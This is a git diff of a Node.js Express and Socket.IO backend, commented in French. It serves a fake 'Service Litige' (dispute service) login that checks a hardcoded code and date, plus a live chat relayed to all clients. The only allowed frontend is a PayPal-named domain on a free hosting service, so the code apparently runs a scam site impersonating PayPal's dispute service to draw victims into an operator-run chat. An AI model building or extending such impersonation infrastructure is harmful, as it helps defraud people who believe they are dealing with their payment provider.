@@ -1,80 +1,80 @@
-// Import des modules nécessaires
+// --- Import des modules nécessaires ---
 const express = require('express');
 const http = require('http');
 const { Server } = require("socket.io");
 const cors = require('cors');
 
-// --- Configuration initiale ---
+// --- Initialisation du serveur ---
 const app = express();
-// On crée un serveur HTTP à partir de l'application Express
-// C'est nécessaire pour pouvoir y attacher Socket.IO
-const server = http.createServer(app); 
+const server = http.createServer(app);
 
-// On autorise les requêtes depuis n'importe quelle origine (pour le développement)
-// En production, il faudrait restreindre à l'URL de votre frontend
-app.use(cors()); 
+// --- Configuration de CORS (Cross-Origin Resource Sharing) ---
+// C'est la partie la plus importante pour le déploiement.
+// Nous devons autoriser l'URL de notre frontend à communiquer avec ce backend.
+const frontendURL = "https://paypal-owpo.onrender.com"; // <-- METTEZ L'URL DE VOTRE FRONTEND ICI
 
-// On active le middleware pour parser le JSON des requêtes entrantes
-app.use(express.json());
+const corsOptions = {
+  origin: frontendURL,
+  optionsSuccessStatus: 200
+};
+app.use(cors(corsOptions));
 
-// --- Données du litige (hardcodées comme demandé) ---
-const CORRECT_CODE = "H25lnFfA3mNbU4nF5WDZ";
-const CORRECT_DATE = "18/09/2025";
-
-// --- Configuration de Socket.IO pour le chat temps réel ---
+// --- Initialisation de Socket.IO ---
 const io = new Server(server, {
   cors: {
-    origin: "*", // Accepte les connexions de n'importe où
+    origin: frontendURL,
     methods: ["GET", "POST"]
   }
 });
 
-// --- Logique du serveur de chat ---
-// Se déclenche à chaque fois qu'un utilisateur se connecte au chat
-io.on('connection', (socket) => {
-  console.log('Un utilisateur s\'est connecté au chat:', socket.id);
+// Middleware pour parser le JSON des requêtes
+app.use(express.json());
 
-  // Message de bienvenue du service litige (simulé)
-  // On envoie un message uniquement à l'utilisateur qui vient de se connecter
-  socket.emit('chat message', { 
-    user: 'Service Litige', 
-    text: 'Bonjour ! Comment puis-je vous aider concernant votre dossier ?' 
-  });
+// --- Données du litige (hardcodées) ---
+const CORRECT_CODE = "H25lnFfA3mNbU4nF5WDZ";
+const CORRECT_DATE = "18/09/2025";
 
-  // Se déclenche quand un message est reçu d'un utilisateur
-  socket.on('chat message', (msg) => {
-    console.log('Message reçu: ', msg);
-    // On renvoie le message à TOUS les utilisateurs connectés, y compris l'expéditeur
-    io.emit('chat message', msg); 
-  });
-
-  // Se déclenche quand un utilisateur se déconnecte
-  socket.on('disconnect', () => {
-    console.log('Un utilisateur s\'est déconnecté:', socket.id);
-  });
-});
-
-
-// --- Route API pour la vérification ---
-// C'est le point d'entrée pour la page de connexion
+// --- Route API pour la vérification de la connexion ---
+// Le frontend enverra une requête POST ici pour vérifier les identifiants.
 app.post('/verify', (req, res) => {
-  // On récupère le code et la date envoyés par le frontend
   const { code, date } = req.body;
 
-  console.log(`Tentative de connexion avec le code: ${code} et la date: ${date}`);
-
-  // On vérifie si les informations correspondent
   if (code === CORRECT_CODE && date === CORRECT_DATE) {
-    // Si c'est correct, on envoie une réponse positive
-    res.status(200).json({ success: true, message: 'Authentification réussie.' });
+    // Si les informations sont correctes, on renvoie un succès.
+    res.status(200).json({ success: true, message: 'Authentification réussie' });
   } else {
-    // Sinon, on envoie une erreur 401 (Non autorisé)
-    res.status(401).json({ success: false, message: 'Code ou date invalide.' });
+    // Sinon, on renvoie une erreur.
+    res.status(401).json({ success: false, message: 'Code ou date invalide' });
   }
 });
 
+// --- Gestion des connexions Socket.IO (pour le chat en temps réel) ---
+io.on('connection', (socket) => {
+  console.log('Un utilisateur est connecté au chat !');
+
+  // Message de bienvenue envoyé automatiquement au client qui vient de se connecter.
+  socket.emit('chat message', {
+    user: 'Service Litige',
+    text: 'Bonjour ! Comment pouvons-nous vous aider avec votre dossier ?'
+  });
+
+  // Lorsqu'on reçoit un message d'un client...
+  socket.on('chat message', (msg) => {
+    // On le renvoie à TOUS les clients connectés (l'utilisateur et le service litige).
+    io.emit('chat message', msg);
+  });
+
+  // Gère la déconnexion d'un utilisateur.
+  socket.on('disconnect', () => {
+    console.log('Un utilisateur s\'est déconnecté');
+  });
+});
+
 // --- Démarrage du serveur ---
-const PORT = process.env.PORT || 3001; // Le port 3001 est souvent utilisé pour les API en développement
+// Render fournit automatiquement le port via la variable d'environnement PORT.
+// Si on est en local, on utilise le port 3001 par défaut.
+const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
   console.log(`Le serveur est démarré et écoute sur le port ${PORT}`);
 });
+
